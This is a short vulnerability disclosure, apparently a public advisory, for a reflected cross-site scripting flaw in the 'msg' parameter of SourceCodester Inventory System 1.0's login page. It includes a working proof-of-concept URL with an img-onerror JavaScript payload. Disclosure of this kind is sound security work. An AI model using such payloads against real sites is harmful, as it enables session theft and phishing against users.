# Reflected XSS in Inventory System (Login Page)

## Overview

* **Vulnerability Type**: Reflected Cross-Site Scripting (XSS)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Login Page (`index.php`)
* **Vulnerable Parameter**: `msg` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `index.php` file.

The application accepts the `msg` parameter via a GET request and reflects it back to the user without proper sanitization or escaping. This allows remote attackers to inject malicious JavaScript code, which is executed in the context of the victim's browser when they visit a crafted URL.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Exploit**: Access the following URL in a web browser.

**PoC Payload:**

```
http://127.0.0.1:8089/index.php?msg=%3Cimg%20src=%22x%22%20onerror=%22alert(789547)%22%3E&type=error

```

## Proof of Concept

When the victim visits the link, the payload `<img src="x" onerror="alert(789547)">` is rendered, causing an alert box with the number `789547` to appear.

<img width="981" height="700" alt="图片" src="https://github.com/user-attachments/assets/fef234b0-fd7d-45b2-91d8-c348d54f33ed" />


## Impact

* **Session Hijacking**: Attackers can steal session cookies.
* **Phishing**: Attackers can modify the page content to trick users.
* **Malicious Actions**: Execute arbitrary actions on behalf of the user.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
